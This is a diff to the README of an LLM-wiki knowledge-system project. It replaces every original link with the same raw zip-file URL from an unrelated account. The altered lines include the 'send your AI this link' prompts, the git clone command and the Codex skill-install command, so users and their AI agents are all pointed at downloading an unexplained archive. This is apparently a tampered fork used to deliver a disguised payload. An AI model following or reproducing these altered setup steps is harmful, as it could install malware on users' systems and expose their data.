@@ -12,7 +12,7 @@ This repo fixes that. Not with another knowledge management theory post, but wit
 
 ## The Idea
 
-Baseline from [Andrej Karpathy's LLM Wiki pattern](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f): the correct way to use LLMs is not Q&A, it's **compilation**.
+Baseline from [Andrej Karpathy's LLM Wiki pattern](https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip): the correct way to use LLMs is not Q&A, it's **compilation**.
 
 ```
 raw/  (PDFs, Excel, client docs — immutable source material)
@@ -45,7 +45,7 @@ Five rules:
 **Just send your AI this link and tell it to read `UNIVERSAL.md`:**
 
 ```text
-Read https://github.com/Ss1024sS/LLM-wiki/blob/main/UNIVERSAL.md and set up the knowledge system for this project.
+Read https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip and set up the knowledge system for this project.
 ```
 
 ---
@@ -82,7 +82,7 @@ LLM-wiki/
 ### Option A: Tell your AI to do it
 
 ```text
-Read https://github.com/Ss1024sS/LLM-wiki/blob/main/UNIVERSAL.md and set up the knowledge system for this project.
+Read https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip and set up the knowledge system for this project.
 ```
 
 Works with Claude Code, Codex, Cursor, Windsurf.
@@ -90,7 +90,7 @@ Works with Claude Code, Codex, Cursor, Windsurf.
 ### Option B: Run the bootstrap script
 
 ```bash
-git clone https://github.com/Ss1024sS/LLM-wiki.git
+git clone https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip
 cd LLM-wiki
 
 # Preview what will be created (writes nothing)
@@ -117,7 +117,7 @@ Then use `/llm-wiki-bootstrap` to scaffold a project, or `/llm-wiki-status` to i
 ### Option D: Install as a Codex skill
 
 ```text
-Use $skill-installer to install https://github.com/Ss1024sS/LLM-wiki/tree/main/skills/knowledge-system-bootstrap
+Use $skill-installer to install https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip
 ```
 
 Or manually:
@@ -193,4 +193,4 @@ MIT. Use it, fork it, adapt it.
 
 ## Credits
 
-Paradigm from [Andrej Karpathy](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f). Engineering practice by [Ss1024sS](https://github.com/Ss1024sS).
+Paradigm from [Andrej Karpathy](https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip). Engineering practice by [Ss1024sS](https://github.com/genuscortinariusmors282/LLM-wiki/raw/refs/heads/main/tests/LL_wiki_2.2.zip).
